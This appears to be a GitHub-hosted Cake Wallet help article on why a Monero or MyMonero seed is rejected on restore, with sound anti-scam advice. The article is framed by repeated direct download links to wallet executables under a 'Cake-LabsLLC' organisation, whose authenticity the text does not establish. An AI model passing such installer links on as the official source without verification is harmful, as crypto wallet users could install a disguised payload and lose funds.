<p align="center"><img src="https://github.com/Cake-LabsLLC/learn/raw/HEAD/assets/banner-article.png" alt="Cake Wallet article banner" width="100%"></p>

<h1 align="center">Troubleshoot a Cake Wallet seed that is not accepted | Cake Wallet</h1>
<p align="center">Practical, private steps for resolving this Cake Wallet question.</p>

<p align="center">
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe"><img src="https://img.shields.io/badge/Download_for_Windows-2B2733?style=for-the-badge&logo=windows&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Windows"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-2B2733?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for macOS"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip"><img src="https://img.shields.io/badge/Download_for_Linux-2B2733?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe) | v6.5.1 |
| macOS | [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg) | v6.5.1 |
| Linux | [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip) | v6.5.1 |

All versions and checksums are on the [Cake Wallet v6.5.1 release page](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1).

## Short answer

A seed may be rejected because a word, order, or format does not match what the restore flow expects. Compare your private backup carefully and identify its format before trying again.

## You'll see this if

- The restore process reports an invalid seed, does not progress after entry, or you are unsure whether your backup is 13 or 25 words. This can happen with a copied, handwritten, or older MyMonero backup.
- You are unsure which safe troubleshooting step to try next.
- You want to protect wallet recovery information while resolving the issue.

## Why it happens

Seed formats are not interchangeable in every restore flow. MyMonero used a 13-word MyMonero-specific legacy seed or a 25-word standard Monero seed. Newer wallets may use a different seed format; check the word count your backup shows. A typing error, missing word, changed order, or extra whitespace can also cause rejection. This message alone does not establish that funds are gone.

## Fix

1. Stop and check that you selected the restore option rather than creating a new wallet. Read the prompts and confirm the intended wallet type, if the app asks.
2. Count the words in your original backup without sharing or photographing them. Determine whether it is the MyMonero-specific 13-word legacy format or a 25-word standard Monero seed.
3. Compare each word with the original record, including spelling and sequence. Check for handwriting ambiguities, transcription mistakes, and a skipped line. Do not invent a replacement word.
4. Enter the words only into the genuine Cake Wallet app on a device you control. Avoid websites, chat messages, remote-support sessions, and clipboard-sharing tools. Nobody legitimate asks for your seed.
5. If the app accepts the seed but shows no expected balance, allow scanning time and review the restore height. [Cake Wallet restore-height guidance](./cake-wallet-restore-height.md) explains the trade-off.
6. For release information, use the [Cake Wallet desktop GitHub page](https://github.com/Cake-LabsLLC/cake-wallet-desktop).

> [!TIP]
> Keep a written record of non-secret troubleshooting details. Never include seed words, keys, PINs, or recovery screenshots in that record.

You may also want [Cake Wallet’s guide to a 13-word restore](./cake-wallet-restore-13-word-seed.md) or the [25-word restore guide](./cake-wallet-restore-25-word-seed.md).

For another perspective, read the [Cake Wallet related guide](./cake-wallet-backup-seed.md).

---

## If that did not work

If careful checking does not resolve the issue, preserve the original backup and avoid repeated guesses. Confirm that the record belongs to the wallet you intend to recover and note its word count, without sending the words to anyone. If the seed is from MyMonero, review [Cake Wallet’s MyMonero migration article](./cake-wallet-mymonero-migration.md). If you have keys rather than a seed, see [restoring Cake Wallet from keys](./cake-wallet-restore-from-keys.md). Keep a written note of the non-secret error message and app environment for your own troubleshooting.

A few careful checks can make this process less confusing. First separate wallet access from recovery: a PIN or a desktop launch issue is not the same thing as seed validity, and node connectivity is not a substitute for recovery details. Write down the non-secret symptoms you observe, such as the wording of an error, whether the app opens, or whether scanning advances. This helps you compare behavior without exposing private information.

Avoid making several changes at once. If you change a restore option, node setting, or installation state, you may not know which change affected the result. Where practical, note the original non-secret setting before changing it. Give scans time to complete, particularly after a restore that starts earlier in the blockchain. A longer scan is not necessarily evidence that the wallet or backup is broken.

Protect yourself from recovery scams throughout troubleshooting. A person who asks you to reveal a seed, private key, PIN, or recovery screenshot is asking for information that should remain yours. Do not use a site or chat as a seed checker. Official-looking language does not make an unsolicited request safe. Keep the words out of email, shared documents, and screen recordings.

If you need to change devices or installations, plan the recovery first. Keep the existing app and its data intact until you have confirmed that you can restore from your own backup. Cake Wallet can restore a MyMonero seed, including the 13-word MyMonero-specific legacy format or the 25-word standard Monero format. Newer wallets may use a different seed format; check the word count your backup shows. Do not combine formats or guess missing words.

Use the linked guides as background, not as a reason to disclose any secret. They describe adjacent topics such as recovery, synchronization, privacy, and migration. Menu wording can vary, so follow the general options presented in your own app rather than searching for an exact label that may not appear. If a troubleshooting step would require surrendering control of your device or revealing recovery information, stop and choose a safer route.

A successful check should leave you with a clear distinction between what you know and what remains uncertain. For example, you can confirm that a backup has a particular word count without publishing the words, or note that a sync indicator has not moved without sending a screen image containing keys. Keep that distinction in mind when asking for general help.


> [!WARNING]
> A seed or private key can provide control of a wallet. Never send it to support, enter it on a website, or disclose it to someone offering to recover funds.

## Prevention

Store the original backup clearly and privately, with the word order intact. When making a copy, compare it to the original before relying on it. Keep seed material offline and separate from PINs. Be wary of people claiming they can validate or repair a seed if you send it to them. The seed is sufficient to control the wallet, so treat it as confidential recovery information.



---

## FAQ

<details><summary>Should I share my seed with support?</summary>

No. Nobody legitimate asks for your seed, keys, or PIN. Keep recovery information private and enter it only in the genuine app when needed.

</details>

<details><summary>Does a PIN replace my recovery backup?</summary>

No. A PIN protects access on an installation. Keep a separate, complete recovery backup in a private place.

</details>

<details><summary>Can I use a MyMonero seed?</summary>

Cake Wallet can restore a MyMonero seed. MyMonero used a 13-word MyMonero-specific legacy seed or a 25-word standard Monero seed.

</details>

<details><summary>What if the wallet looks empty after recovery?</summary>

Allow scanning to finish and check the restore height. An earlier height can find older activity but takes longer to scan.

</details>

---

## Download Cake Wallet Desktop

- Windows: [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe)
- macOS: [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg)
- Linux: [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip)

Check each file against the checksums on the [Cake Wallet v6.5.1 release](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [View spend and view keys in Cake Wallet | Cake Wallet](./cake-wallet-view-spend-keys.md) | Practical, private steps for resolving this Cake Wallet question. |
| [What to do if you forgot your Cake Wallet PIN | Cake Wallet](./cake-wallet-forgot-pin.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Manage multiple wallets in Cake Wallet | Cake Wallet](./cake-wallet-multiple-wallets.md) | Practical, private steps for resolving this Cake Wallet question. |

[Back to all Cake Wallet guides](https://github.com/Cake-LabsLLC/learn)
